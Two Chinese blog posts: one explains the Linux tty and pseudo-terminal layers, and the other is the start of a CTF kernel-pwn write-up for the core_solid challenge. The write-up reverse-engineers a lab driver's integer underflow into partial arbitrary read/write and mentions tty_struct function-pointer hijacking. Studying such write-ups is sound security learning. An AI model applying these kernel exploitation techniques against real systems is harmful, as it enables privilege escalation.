<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">			<span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">	<span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">	<span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">	<span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">		      <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">	<span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">	<span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">		    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">	<span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">			     <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">	<span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">	<span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">	<span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">	<span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">	<span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">	<span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">	<span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">	<span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">	<span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">	<span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">				struct serial_icounter_struct *icount);</span><br><span class="line">	<span class="keyword">int</span>  (*get_serial)(struct tty_struct *tty, struct serial_struct *p);</span><br><span class="line">	<span class="keyword">int</span>  (*set_serial)(struct tty_struct *tty, struct serial_struct *p);</span><br><span class="line">	<span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">	<span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">	<span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">	<span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p><code>tty_struct</code> 结构体的大小为 <code>0x2E0</code>，在 kernel pwn 中，如果可以有 <code>kmalloc-1k</code> 我们就会考虑进行 <code>tty_struct attack</code>（劫持 <code>tty_operations</code>，控制执行流）</p>
<p>内核的利用并不是本篇文章的重点，接下来我们将关注 <code>tty</code> 本身在内核中的作用</p>
<p><strong>仿真终端</strong></p>
<p><code>tty</code> 其实是 “电传打字机(Teletypewriter)” 的缩写（后来这种设备逐渐键盘和显示器取代），泛指计算机的终端（terminal）设备 </p>
<ul>
<li>在 Linux 或 UNIX 中，<code>tty</code> 变为了一个抽象设备（用于表示各种类型的终端设备）：<ul>
<li>有时它指的是一个物理输入设备（例如串口）</li>
<li>有时它指的是一个允许用户和系统交互的“虚拟仿真终端设备”</li>
</ul>
</li>
</ul>
<p>现代物理 IO 设备都采用“键盘+显示器”：</p>
<ul>
<li>如果用户态程序要把内容输出到显示器，只要把这些内容写入到显示器对应的 <code>tty</code> 设备就可以了，然后由 <code>tty</code> 层负责匹配合适的驱动完成输出，这也是 Linux 控制台的工作原理：</li>
</ul>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665118227239.png" class width="1665118227239"> 
<ul>
<li>显示器和键盘这类物理设备会被抽象为驱动 driver</li>
<li>而终端仿真程序 Terminal Emulator（虚拟终端）使用驱动接口完成进一步的抽象</li>
<li>本质上来讲键盘输入的字符是没有意义的，而终端仿真程序会对这些字符进行“格式化”，“适配”和“解释”，这个过程被称为行规程 Line Discipline</li>
<li>经过行规程的数据将会通过 <code>tty</code> 和用户层进行交互，同时返回输出数据</li>
<li>返回的数据也要经过行规程，然后被“翻译”为显示器驱动可以理解的形式并输出</li>
</ul>
<p>在 Linux 中可以直接查看 <code>tty</code> 层的设备：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ls /dev/tty*</span><br><span class="line">/dev/tty    /dev/tty23  /dev/tty39  /dev/tty54      /dev/ttyS10  /dev/ttyS26</span><br><span class="line">/dev/tty0   /dev/tty24  /dev/tty4   /dev/tty55      /dev/ttyS11  /dev/ttyS27</span><br><span class="line">/dev/tty1   /dev/tty25  /dev/tty40  /dev/tty56      /dev/ttyS12  /dev/ttyS28</span><br><span class="line">/dev/tty10  /dev/tty26  /dev/tty41  /dev/tty57      /dev/ttyS13  /dev/ttyS29</span><br><span class="line">/dev/tty11  /dev/tty27  /dev/tty42  /dev/tty58      /dev/ttyS14  /dev/ttyS3</span><br><span class="line">/dev/tty12  /dev/tty28  /dev/tty43  /dev/tty59      /dev/ttyS15  /dev/ttyS30</span><br><span class="line">/dev/tty13  /dev/tty29  /dev/tty44  /dev/tty6       /dev/ttyS16  /dev/ttyS31</span><br><span class="line">/dev/tty14  /dev/tty3   /dev/tty45  /dev/tty60      /dev/ttyS17  /dev/ttyS4</span><br><span class="line">/dev/tty15  /dev/tty30  /dev/tty46  /dev/tty61      /dev/ttyS18  /dev/ttyS5</span><br><span class="line">/dev/tty16  /dev/tty31  /dev/tty47  /dev/tty62      /dev/ttyS19  /dev/ttyS6</span><br><span class="line">/dev/tty17  /dev/tty32  /dev/tty48  /dev/tty63      /dev/ttyS2   /dev/ttyS7</span><br><span class="line">/dev/tty18  /dev/tty33  /dev/tty49  /dev/tty7       /dev/ttyS20  /dev/ttyS8</span><br><span class="line">/dev/tty19  /dev/tty34  /dev/tty5   /dev/tty8       /dev/ttyS21  /dev/ttyS9</span><br><span class="line">/dev/tty2   /dev/tty35  /dev/tty50  /dev/tty9       /dev/ttyS22</span><br><span class="line">/dev/tty20  /dev/tty36  /dev/tty51  /dev/ttyprintk  /dev/ttyS23</span><br><span class="line">/dev/tty21  /dev/tty37  /dev/tty52  /dev/ttyS0      /dev/ttyS24</span><br><span class="line">/dev/tty22  /dev/tty38  /dev/tty53  /dev/ttyS1      /dev/ttyS25</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/dev/tty</code>：（控制终端）<ul>
<li>代表当前 <code>tty</code> 设备</li>
<li>在当前的终端中输入 <code>echo hello &gt; /dev/tty</code> ，都会直接显示在当前的终端中</li>
</ul>
</li>
<li><code>/dev/tty1 ~ /dev/tty6</code>：（虚拟终端）<ul>
<li>用于表示运行在内核态的软件仿真终端 </li>
<li>可以把这些 <code>tty</code> 设备理解为对虚拟终端的一种抽象，使得用户程序能以操控文件的形式来与虚拟终端交互</li>
</ul>
</li>
<li><code>/dev/tty0</code>：（虚拟终端）<ul>
<li>代表当前虚拟终端</li>
<li><code>/dev/tty</code> 主要是针对进程来说的，而 <code>/dev/tty0</code> 是针对整个系统来说的（所以 <code>/dev/tty0</code> 拥有更高的权限）</li>
</ul>
</li>
<li><code>/dev/tty7 ~ /dev/tty63</code>：（其他终端）<ul>
<li>用于表示运行在内核态的其他终端</li>
<li>这些 <code>tty</code> 是由其他的关键软件使用的（例如 Ubuntu 中 <code>/dev/tty7</code> 就是图形显示管理器）</li>
</ul>
</li>
<li><code>/dev/ttyS0 ~ /dev/ttyS31</code>：（串行端口终端）<ul>
<li>是使用计算机串行端口连接的终端设备</li>
</ul>
</li>
</ul>
<p>我们可以做一个实验来感受一下 <code>/dev/tty1 ~ /dev/tty6</code>：</p>
<ul>
<li>先在当前终端中输入 <code>Ctrl + Alt + F4</code> 切换到 <code>/dev/tty4</code></li>
</ul>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665123646699.png" class width="1665123646699"> 
<ul>
<li>上图显示的就是一个虚拟终端 Terminal Emulator，用户态的 Shell 运行在它上面</li>
<li>输入 <code>Ctrl + Alt + F2</code> 切换到桌面环境，输入 <code>sudo echo &quot;hello&quot; &gt; /dev/tty4</code>，然后返回 <code>/dev/tty4</code></li>
</ul>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665123684018.png" class width="1665123684018"> 
<ul>
<li>通过操作 <code>/dev/tty4</code> 文件，可以把用户态程序输入的内容输出到对应的虚拟终端上</li>
</ul>
<p>可以认为 <code>tty</code> 是虚拟终端的一个抽象层：</p>
<ul>
<li><code>tty</code> 给用户态程序 Shell 提供了一种抽象，使其能够以操作文件的形式来控制各种终端</li>
</ul>
<p>但是 <code>tty</code> 是运行在内核态中的，为了便于将终端仿真移入用户空间，同时仍保持 <code>tty</code> 子系统的完整，伪终端被发明了出来（被称为 <code>pseudo-TTY</code>，简称 <code>pty</code>）</p>
<ul>
<li>每当你在系统中启动一个终端仿真器或使用任何类型的 shell 时，它都会与 <code>pty</code> 进行交互</li>
<li>当创建一个伪终端时，会在 <code>/dev/pts</code> 目录下创建一个设备文件（用于关联 <code>pty</code>）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ls -l /dev/pts </span><br><span class="line">总用量 0</span><br><span class="line">crw--w---- 1 yhellow tty  136, 0 10月  7 20:24 0</span><br><span class="line">crw--w---- 1 yhellow tty  136, 1 10月  7 20:24 1</span><br><span class="line">crw--w---- 1 yhellow tty  136, 2 10月  7 20:41 2</span><br><span class="line">c--------- 1 root    root   5, 2 10月  7 19:14 ptmx</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ lsof /dev/ptmx</span><br><span class="line">COMMAND    PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">gnome-ter 4015 yhellow   19u   CHR    5,2      0t0   87 /dev/ptmx</span><br><span class="line">gnome-ter 4015 yhellow   20u   CHR    5,2      0t0   87 /dev/ptmx</span><br><span class="line">gnome-ter 4015 yhellow   21u   CHR    5,2      0t0   87 /dev/ptmx</span><br></pre></td></tr></table></figure>
<ul>
<li>你可以在终端仿真器中输入 <code>tty</code> 来找到相关联的 <code>pty</code>：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ tty                                        </span><br><span class="line">/dev/pts/0</span><br></pre></td></tr></table></figure>
<p><strong>伪终端</strong></p>
<p>伪终端（被称为 <code>pseudo-tty</code>，简称 <code>pty</code>）是指伪终端 master 和伪终端 slave 这一对字符设备，其中的 slave 对应 <code>/dev/pts/</code> 目录下的一个文件，而 master 则在内存中标识为一个文件描述符(fd)：</p>
<ul>
<li>master 端 - <code>ptm</code>：是更接近用户显示器、键盘的一端（基于 VFS 的特殊文件）</li>
<li>slave 端 - <code>pts</code>：是在虚拟终端上运行的 CLI（Command Line Interface，命令行接口）程序</li>
</ul>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665128335077.png" class width="1665128335077"> 
<p>伪终端本质上是运行在用户态的终端模拟器创建的一对字符设备：</p>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665128404943.png" class width="1665128404943"> 
<ul>
<li><code>/dev/ptmx</code> 是一个字符设备文件，当进程打开 <code>/dev/ptmx</code> 文件时，进程会同时获得：<ul>
<li>一个指向 <code>pseudoterminal master(ptm)</code> 的文件描述符</li>
<li>一个在 <code>/dev/pts</code> 目录中创建的 <code>pseudoterminal slave(pts)</code> 设备 </li>
</ul>
</li>
<li>建了一个伪终端对，并让 shell 运行在 slave 端：<ul>
<li>当用户在终端模拟器中按下键盘按键时，它产生字节流并写入 master 中，shell 便可从 master 中读取输入（以读文件的形式）</li>
<li>然后 shell 和它的子程序将输出内容写入 slave 中，由 CLI 程序进行显示</li>
</ul>
</li>
</ul>
<p>可以认为 <code>pty</code> 是一种轻量级的虚拟终端：</p>
<ul>
<li>是一些软件（如 ssh、screen、xterm 等）模拟的 Terminal Emulator</li>
<li>在 Linux 中右键打开的终端就是 <code>pty</code></li>
</ul>
<p><strong>伪终端的运用</strong></p>
<p>Telnet 和 SSH 都运用了伪终端技术（主要是远程登录部分）：</p>
<ul>
<li>每次用户通过客户端连接服务端的时候，服务端创建一个伪终端 master、slave 字符设备对</li>
<li>在 slave 端运行 login 程序，将 master 端的输入输出通过网络传送至客户端</li>
<li>客户端则将从网络收到的信息直接关联到键盘/显示器上</li>
</ul>
<img src="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/1665146881569.png" class width="1665146881569"> 
<ul>
<li>网络通信的方式还是依靠 NC 底层的 socket（TCP 协议发包）</li>
<li>将 socket 生成的 socketFD 重定位为 master 端的“标准输入”（把管道的 <code>stdin</code> 重定位为 socketFD，再把管道的 <code>stdout</code> 重定位为 master）</li>
<li>使 master 端和 socketFD 共用一个命名管道（命名管道相当于两个文件，一个用来读，一个用来写，它们底层使用同一个 <code>inode</code> 所以数据共享）</li>
<li>最后把 login 的 <code>stdin stdout stderr</code> 重定位到 slave 上</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/05/HijackPrctl+kernel_base%E7%88%86%E7%A0%B4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/05/HijackPrctl+kernel_base%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">HijackPrctl+kernel_base爆破</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-05 22:14:05 / Modified: 22:16:29" itemprop="dateCreated datePublished" datetime="2022-10-05T22:14:05+08:00">2022-10-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>core_solid 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1  kaslr&quot; \</span><br><span class="line">-cpu qemu64,+smep,+smap \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-s \</span><br><span class="line">-nographic  -enable-kvm \</span><br></pre></td></tr></table></figure>
<ul>
<li>kaslr，smep，smap</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig lo 127.0.0.1 netmask 255.255.255.0</span><br><span class="line">route add -net 127.0.0.0 netmask 255.255.255.0 lo</span><br><span class="line">echo &quot;flag&#123;hijack_prctl_is_fun_and_function_pointer_is_dangerous&#125;&quot; &gt; /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">insmod /simp1e.ko</span><br><span class="line">chmod 777 /proc/simp1e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">poweroff -d 1800000 -f &amp;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<ul>
<li>kptr_restrict，dmesg_restrict</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>驱动程序的逆向有点麻烦，主要是 <code>csaw_ioctl</code> 不同功能传入的结构体不同</p>
<ul>
<li>3个8字节，有时是指针，有时是 size，甚至有时只传入4字节</li>
</ul>
<p>而函数 <code>csaw_ioctl</code> 中只定义了一个结构体 <code>channel_args_from</code>，于是我就默认每个位置的功能固定，走了不少弯路，最后是通过函数名和一些特殊函数分析出了 <code>channel_args_from</code> 各个位置的含义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alloc_new_ipc_channel <span class="comment">/* 因为里面有kmalloc,可以判断传入的参数为size */</span></span><br><span class="line">realloc_ipc_channel <span class="comment">/* 传入的参数为ID */</span></span><br><span class="line">get_channel_by_id <span class="comment">/* 传入的参数为ID */</span></span><br><span class="line">mutex_lock <span class="comment">/* 传入的参数为mutex */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>顺带一提，以下两个结构体在驱动模块中经常出现（部分条目可能不一样）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">list</span> struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_4)</span><br><span class="line"><span class="number">00000000</span> item dq ?                               ; offset</span><br><span class="line"><span class="number">00000008</span> mutex dq ?                              ; offset</span><br><span class="line"><span class="number">00000010</span> field_10 dq ?</span><br><span class="line"><span class="number">00000018</span> field_18 dq ?</span><br><span class="line"><span class="number">00000020</span> field_20 dq ?</span><br><span class="line"><span class="number">00000028</span> <span class="built_in">list</span> ends</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> item struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_5)</span><br><span class="line"><span class="number">00000000</span> refcount dd ?</span><br><span class="line"><span class="number">00000004</span> index dd ?</span><br><span class="line"><span class="number">00000008</span> buf dq ?                                ; offset</span><br><span class="line"><span class="number">00000010</span> size dq ?</span><br><span class="line"><span class="number">00000018</span> data dq ?                               ; offset</span><br><span class="line"><span class="number">00000020</span> item ends</span><br></pre></td></tr></table></figure>
<p>程序的漏洞点就在 <code>realloc_ipc_channel</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( key_cannel )</span><br><span class="line">    size = channel-&gt;size + user_size;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    size = channel-&gt;size - user_size; <span class="comment">/* 负数溢出 */</span></span><br><span class="line">buf = (<span class="keyword">char</span> *)krealloc(channel-&gt;buf, size + <span class="number">1</span>, <span class="number">0x14000C0</span>LL);</span><br><span class="line"><span class="keyword">if</span> ( buf )</span><br><span class="line">&#123;</span><br><span class="line">    item-&gt;buf = buf; </span><br><span class="line">    item-&gt;size = size; <span class="comment">/* 为item赋值新的size */</span></span><br><span class="line">    err = _InterlockedDecrement(&amp;item-&gt;refcount);</span><br><span class="line">    key = err == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( err &lt; <span class="number">0</span> )</span><br><span class="line">        __asm &#123; ud0 &#125;</span><br><span class="line">    <span class="keyword">if</span> ( key )</span><br><span class="line">    &#123;</span><br><span class="line">        ipc_channel_destroy(item);</span><br><span class="line">        LODWORD(channel) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        LODWORD(channel) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果 <code>user_size</code> 大于 <code>channel-&gt;size</code> 就会导致负数溢出</li>
<li>但这里我们想要的不是 <code>krealloc</code> 申请的大空间，而是 <code>channel-&gt;buf</code> 空间不变，但是 <code>item-&gt;size</code> 超大，可以绕过后面的检查：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">item_write = using_list-&gt;item;</span><br><span class="line">size = channel_from.size;</span><br><span class="line"><span class="keyword">if</span> ( !using_list-&gt;item )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">data_write = item_write-&gt;data;</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)&amp;data_write[channel_from.size] &gt; item_write-&gt;size )</span><br><span class="line">    <span class="comment">/* item_write-&gt;size非常大,实现局部任意写 */</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">addr = (<span class="keyword">unsigned</span> __int64)&amp;item_write-&gt;buf[(<span class="keyword">unsigned</span> __int64)data_write];</span><br><span class="line"><span class="keyword">if</span> ( addr &lt;= <span class="number">0xFFFFFFFF7FFFFFFF</span>LL )</span><br><span class="line">    <span class="comment">/* 程序进行了限制,写的范围必须大于0xFFFFFFFF7FFFFFFF */</span></span><br><span class="line">    printk(<span class="string">&quot;16Access Denied\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( strncpy_from_user(addr, channel_from.user_ptr, channel_from.size) &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="comment">/* 把用户指针user_ptr中的数据拷贝到using_list-&gt;item-&gt;data中 */</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序将在 CSAW_WRITE_CHANNEL 完成局部任意写</li>
</ul>
<p><strong>任意读写</strong></p>
<p>程序利用 CSAW_SEEK_CHANNEL 和 CSAW_READ_CHANNEL 可以完成局部任意读：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">item_seek-&gt;data = channel_from.user_ptr;</span><br></pre></td></tr></table></figure>
